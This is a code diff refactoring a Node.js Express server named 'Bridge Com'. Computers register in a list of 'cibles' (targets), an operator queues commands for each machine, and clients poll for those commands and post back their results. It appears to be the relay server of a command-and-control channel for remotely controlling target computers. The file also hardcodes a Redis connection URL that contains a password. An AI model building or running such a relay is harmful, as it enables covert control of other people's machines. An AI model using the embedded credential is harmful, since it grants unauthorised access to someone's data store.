@@ -2,7 +2,6 @@ const express = require('express');
 const Redis = require('ioredis');
 const app = express();
 
-// Configuration Redis
 const redis = new Redis('redis://default:KJigfboh7I4DYdXfJMXbaq79hTRZ4o3J@redis-19821.c14.us-east-1-2.ec2.redns.redis-cloud.com:19821');
 
 redis.on('connect', () => {
@@ -13,53 +12,32 @@ redis.on('error', (err) => {
     console.error('Erreur Redis: ', err);
 });
 
-// Middleware
 app.use(express.json());
 
-// Lire les données depuis Redis
-const readData = async () => {
-    try {
-        const data = await redis.get('data');
-        return data ? JSON.parse(data) : { cibleList: [], commandes: [], reponses: [] };
-    } catch (err) {
-        console.error("Erreur lors de la lecture de Redis:", err);
-        return { cibleList: [], commandes: [], reponses: [] };
-    }
-};
-
-// Écrire les données dans Redis
-const writeData = async (data) => {
-    try {
-        await redis.set('data', JSON.stringify(data));
-    } catch (err) {
-        console.error("Erreur lors de l'écriture dans Redis:", err);
-    }
-};
-
-// Point de terminaison de base
+// Endpoint de base
 app.get('/', (req, res) => {
     res.send({ message: 'Bridge Com !' });
 });
 
 // Récupération de la liste des cibles
 app.get('/cibles', async (req, res) => {
-    const data = await readData();
-    res.json({ cibleList: data.cibleList });
+    const cibleList = JSON.parse(await redis.get('cibleList')) || [];
+    res.json({ cibleList });
 });
 
 // Récupération de la liste des commandes
 app.get('/commandes', async (req, res) => {
-    const data = await readData();
-    res.json({ commandes: data.commandes });
+    const commandes = JSON.parse(await redis.get('commandes')) || [];
+    res.json({ commandes });
 });
 
 // Ajout d'un nom d'ordinateur
 app.post('/identify', async (req, res) => {
     const { computer_name = 'Unknown' } = req.body;
-    const data = await readData();
-    data.cibleList.push(computer_name);
-    await writeData(data);
-    res.json({ message: `Request from computer: ${computer_name}`, cibleList: data.cibleList });
+    const cibleList = JSON.parse(await redis.get('cibleList')) || [];
+    cibleList.push(computer_name);
+    await redis.set('cibleList', JSON.stringify(cibleList));
+    res.json({ message: `Request from computer: ${computer_name}`, cibleList });
 });
 
 // Ajout d'une commande
@@ -68,24 +46,89 @@ app.post('/commande', async (req, res) => {
     if (!commande) {
         return res.status(400).json({ message: "Commande est requise." });
     }
-    const data = await readData();
+
+    const commandes = JSON.parse(await redis.get('commandes')) || [];
+    const cmdInfo = commande.split("%");
 
     let isExist = false;
-
-    for (let i = 0; i < data.commandes.length; i++) {
-        const dataInfo = data.commandes[i].split("%");
-        const cmdInfo = commande.split("%");
-        if (dataInfo[0] == cmdInfo[0]) {
-            data.commandes[i] = commande;
+    for (let i = 0; i < commandes.length; i++) {
+        const dataInfo = commandes[i].split("%");
+        if (dataInfo[0] === cmdInfo[0]) {
+            commandes[i] = commande;
             isExist = true;
         }
     }
 
-    if (!isExist) data.commandes.push(commande);
-    await writeData(data);
-    res.json({ message: `Commande ajoutée: ${commande}`, commandes: data.commandes });
+    if (!isExist) commandes.push(commande);
+    await redis.set('commandes', JSON.stringify(commandes));
+    res.json({ message: `Commande ajoutée: ${commande}`, commandes });
 });
 
-// Écoute sur le port
+// Récupération d'une commande spécifique
+app.post('/getCommande', async (req, res) => {
+    const { info } = req.body;
+    const commandes = JSON.parse(await redis.get('commandes')) || [];
+    const dataInfo = info.split("%");
+    let newCmd = "";
+
+    commandes.forEach((cmd) => {
+        const dataCmd = cmd.split("%");
+        if (dataCmd[0] === dataInfo[0] && (dataCmd[1] !== dataInfo[1] || dataCmd[2] !== dataInfo[2])) {
+            newCmd = cmd;
+        }
+    });
+
+    if (newCmd) {
+        res.json({ message: 'nouveau commande', commandes: newCmd });
+    } else {
+        res.json({ message: 'Aucune nouveau commande' });
+    }
+});
+
+// Ajout d'une reponse
+app.post('/reponse', async (req, res) => {
+    const { reponse } = req.body;
+    if (!reponse) {
+        return res.status(400).json({ message: "Reponse est requise." });
+    }
+
+    const reponses = JSON.parse(await redis.get('reponses')) || [];
+    const repInfo = reponse.split("%");
+
+    let isExist = false;
+    for (let i = 0; i < reponses.length; i++) {
+        const dataInfo = reponses[i].split("%");
+        if (dataInfo[0] === repInfo[0]) {
+            reponses[i] = reponse;
+            isExist = true;
+        }
+    }
+
+    if (!isExist) reponses.push(reponse);
+    await redis.set('reponses', JSON.stringify(reponses));
+    res.json({ message: `Reponse ajoutée: ${reponse}`, reponses });
+});
+
+// Récupération d'une réponse spécifique
+app.post('/getReponse', async (req, res) => {
+    const { info } = req.body;
+    const reponses = JSON.parse(await redis.get('reponses')) || [];
+    let newRep = "";
+
+    reponses.forEach((rep) => {
+        const dataRep = rep.split("%");
+        if (dataRep[0] === info) {
+            newRep = rep;
+        }
+    });
+
+    if (newRep) {
+        res.json({ message: 'reponse', reponse: newRep });
+    } else {
+        res.json({ message: 'Aucune reponse' });
+    }
+});
+
 const PORT = 5000;
+
 app.listen(PORT, () => console.log(`🚀 @ http://localhost:${PORT}`));
